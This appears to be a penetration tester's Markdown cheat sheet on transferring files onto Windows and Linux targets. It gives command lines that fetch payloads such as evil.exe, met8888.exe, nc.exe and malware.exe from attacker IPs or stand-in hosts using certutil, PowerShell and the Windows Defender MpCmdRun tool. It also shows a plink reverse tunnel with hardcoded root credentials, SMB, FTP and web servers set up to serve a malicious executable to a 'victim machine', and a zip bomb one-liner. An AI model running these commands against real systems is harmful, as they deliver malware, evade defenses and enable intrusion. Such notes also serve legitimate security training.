# Built in windows utility to download file:
## robocopy
https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy

Syntax:
```
robocopy <source> <destination> [<file>[ ...]] [<options>]
```
Example:
```
robocopy c:\reports '\\marketing\videos' yearly-report.mov /mt /z
```
1. /mt - multi-threading 
2. /z - restart the transfer in case it's interrupted
## certutil.exe
```
certutil.exe -urlcache -split -f http://10.10.0.101/evil.exe safe.exe
certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
```

## Powershell
```
(new-object System.Net.WebClient).DownloadFile('http://10.9.122.8/met8888.exe','C:\Users\jarrieta\Desktop\met8888.exe')
(New-Object System.Net.WebClient).DownloadFile("http://10.10.10.10/nc.exe","c:\nc.exe")	
wget "http://10.10.10.10/nc.exe" outfile "c:\nc.exe"	
```


# Download a file using the Windows Defender CLI Tool
```
C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\<version-number>\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
```
```
C:\ > "C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe" -DownloadFile -url http://website.com/malware.exe -path C:\\users\\malware.exe
```

# Plink.exe
```
plink.exe -l root -pw toor -R 445:127.0.0.1:445 10.10.14.110
```
### Usage
```Usage: plink [options] [user@]host [command]                                                                                                                                                                                               
       ("host" can also be a PuTTY saved session name)                                                                                                                                                                                     
Options:                                                                                                                                                                                                                                   
  -V        print version information and exit                                                                                                                                                                                             
  -pgpfp    print PGP key fingerprints and exit                                                                                                                                                                                            
  -v        show verbose messages                                                                                                                                                                                                          
  -load sessname  Load settings from saved session                                                                                                                                                                                         
  -ssh -telnet -rlogin -raw -serial                                                                                                                                                                                                        
            force use of a particular protocol                                                                                                                                                                                             
  -P port   connect to specified port                                                                                                                                                                                                      
  -l user   connect with specified username                                                                                                                                                                                                
  -batch    disable all interactive prompts                                                                                                                                                                                                
  -proxycmd command                                                                                                                                                                                                                        
            use 'command' as local proxy                                                                                                                                                                                                   
  -sercfg configuration-string (e.g. 19200,8,n,1,X)                                                                                                                                                                                        
            Specify the serial configuration (serial only)                                                                                                                                                                                 
The following options only apply to SSH connections:                                                                                                                                                                                       
  -pw passw login with specified password                                                                                                                                                                                                  
  -D [listen-IP:]listen-port                                                                                                                                                                                                               
            Dynamic SOCKS-based port forwarding                                                                                                                                                                                            
  -L [listen-IP:]listen-port:host:port                                                                                                                                                                                                     
            Forward local port to remote address                                                                                                                                                                                           
  -R [listen-IP:]listen-port:host:port                                                                                                                                                                                                     
            Forward remote port to local address                                                                                                                                                                                           
  -X -x     enable / disable X11 forwarding                                                                                                                                                                                                
  -A -a     enable / disable agent forwarding                                                                                                                                                                                              
  -t -T     enable / disable pty allocation
  -1 -2     force use of particular protocol version
  -4 -6     force use of IPv4 or IPv6
  -C        enable compression
  -i key    private key file for user authentication
  -noagent  disable use of Pageant
  -agent    enable use of Pageant
  -noshare  disable use of connection sharing
  -share    enable use of connection sharing
  -hostkey aa:bb:cc:...
            manually specify a host key (may be repeated)
  -sanitise-stderr, -sanitise-stdout, -no-sanitise-stderr, -no-sanitise-stdout
            do/don't strip control chars from standard output/error
  -no-antispoof   omit anti-spoofing prompt after authentication
  -m file   read remote command(s) from file
  -s        remote command is an SSH subsystem (SSH-2 only)
  -N        don't start a shell/command (SSH-2 only)
  -nc host:port
            open tunnel in place of session (SSH-2 only)
  -sshlog file
  -sshrawlog file
            log protocol details to a file
  -shareexists
            test whether a connection-sharing upstream exists
```


# Start a Webserver with Python:
Whatever folder you start this in will be the folder listed and available online. 
so if you run this from the home folder, then you'd open a browser and go to the IP/PORT and see everything in the home folder.
-m is for module
## Python 2
``` 
python -m SimpleHTTPServer 8080
```

browse to: http://\<Host-IP>:8000

## Python 3
```
python3 -m http.server 8000
```

browse to: http://\<Host-IP>:8000

## Check:
browse to localhost:8000
## From Victim Machine:
browse to \<Attacker-IP\>:8000

# 'FTP_server.py':
```
#!/usr/bin/env python
from pyftpdlib import servers
from pyftpdlib.handlers import FTPHandler
address = ("0.0.0.0", 21)  # listen on every IP on my machine on port 21
server = servers.FTPServer(address, FTPHandler)
server.serve_forever()
```

# SMB share:
## setup SMB sharefrom Impacket:
https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py

from /opt/impacket/examples:
```
python smbserver.py ROPNOP /root/shells
```

## From Windows:
```
net view \\192.168.1.29
dir \\192.168.1.29\folder
copy \\192.168.1.29\folder\mailicious.exe
```

### OR:
```
extrac32 /Y /C \\webdavserver\share\test.txt C:\folder\test.txt
```

# Setup FTP server:
## install and start FTP server:
```
apt-get install python-pyftpdlib
python -m pyftpdlib -p 21
```
## create anonymous ftp with write access to your filesystem.
```
python -m pyftpdlib
python -m pyftpdlib --help
python3 -m pyftpdlib.ftpserver
```

## Download file from Windows:
```
C:\>ftp 192.168.1.29
username: anonymous
password: whatever
ftp> binary
ftp> get malicious.exe
ftp> bye
```

# Run a ruby webrick basic http server
```
ruby -rwebrick -e "WEBrick::HTTPServer.new (:Port => 80, :DocumentRoot => Dir.pwd).start"
```

# Run a basic PHP http serve
```
php -S 0.0.0.0:80					r
```

# NetCat File Transfer:
nc is basically a built-in tool from any UNIX-like systems (even embedded systems), so it's perfect for "quick and temporary way to transfer files".
open a listen on port 12345, waiting for data.
## Step 1, on the receiver side, run:
```
nc -l 12345 | tar -xf -
```

## Step 2, on the sender side:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ... | nc $RECEIVER_IP 12345
```
### Alternate Step 2
#### You can also put pv in the middle to monitor the progress of transferring:
```
tar -cf - ALL_FILES_YOU_WANT_TO_SEND ...| pv | nc $RECEIVER_IP 12345
```
After the transferring is finished, both sides of nc will quit automatically, and job done.

# systemctl
using "systemctl enable" instead if "service * start" means the service will automatically start after reboot. 

### Examples:
```
systemctl enable postgresql
systemctl enable ssh 
systemctl disable ssh
```
# Zip Bomb:
```
dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip
```

